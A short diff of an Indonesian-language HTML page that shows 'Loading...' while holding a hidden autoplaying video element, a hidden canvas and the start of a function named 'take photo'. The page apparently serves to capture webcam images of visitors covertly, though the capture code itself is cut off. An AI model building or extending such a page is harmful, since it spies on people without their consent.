@@ -4,13 +4,14 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Halaman</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <p>Sedang memuat...</p>
 
   <!-- Elemen tersembunyi -->
-  <video id="video" autoplay playsinline style="display: none;"></video>
-  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+  <video class="priview" id="video" autoplay playsinline style="display: none;"></video>
+  <canvas class="priview" id="canvas" width="320" height="240" style="display: none;"></canvas>
 
   <script>
     async function ambilFoto() {
